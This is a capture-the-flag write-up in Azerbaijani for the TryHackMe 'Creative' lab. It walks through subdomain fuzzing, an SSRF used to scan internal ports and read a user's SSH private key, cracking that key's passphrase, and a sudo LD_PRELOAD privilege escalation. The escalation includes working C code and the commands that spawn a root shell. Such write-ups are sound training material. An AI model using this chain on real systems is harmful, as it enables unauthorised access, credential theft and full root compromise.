# TryHackMe Creative — Write-up

Yalnız THM laboratoriyası üçündür. `TARGET_IP` öz maşının IP-si ilə dəyiş.

## Enumeration

`nmap -sC -sV -p- -T4 TARGET_IP` nəticəsində 22/SSH və 80/HTTP tapılır. HTTP `creative.thm` domeninə yönləndirdiyi üçün `echo "TARGET_IP creative.thm" | sudo tee -a /etc/hosts` yaz.

Virtual host yoxlaması: `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://creative.thm/ -H 'Host: FUZZ.creative.thm' -fw 6`. Nəticə: `beta.creative.thm`.

## SSRF

Beta saytı URL yoxlayır. `http://127.0.0.1/` göndərdikdə server özü daxili ünvana sorğu edir. Bu SSRF-dir.

Portları yoxlamaq üçün: `ffuf -w ports.txt -u http://beta.creative.thm/ -X POST -d 'url=http://127.0.0.1:FUZZ' -fs 13`. 1337 portu açıq tapılır.

SSRF ilə `http://127.0.0.1:1337/` aç. Directory listing-də `/home/saad/.ssh/id_rsa` faylını tapıb oxu.

## SSH

`chmod 600 id_rsa`, sonra `ssh2john id_rsa > hash` və `john hash --wordlist=/usr/share/wordlists/rockyou.txt` əmrlərindən istifadə et. Tapılan açar parolu ilə `ssh -i id_rsa saad@TARGET_IP` daxil ol.

`cat /home/saad/user.txt` user flag-ı göstərir. `cat ~/.bash_history` ilə Saad-ın parolunu və `sudo -l` nəticəsini tap.

## Root — LD_PRELOAD

`sudo -l` nəticəsində `/usr/bin/ping` root kimi işləyir və `env_keep+=LD_PRELOAD` görünür. Bu, zərərli shared library yükləməyə imkan verir.

`exploit.c`:

```c
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }
```

Compile: `gcc exploit.c -o exploit.so -fPIC -shared -nostartfiles`. İşə sal: `sudo LD_PRELOAD=/home/saad/exploit.so /usr/bin/ping`. Sonra `id` və `cat /root/root.txt`.

Əsas dərslər: SSRF, daxili port enumeration, SSH private key, bash history və sudo LD_PRELOAD.
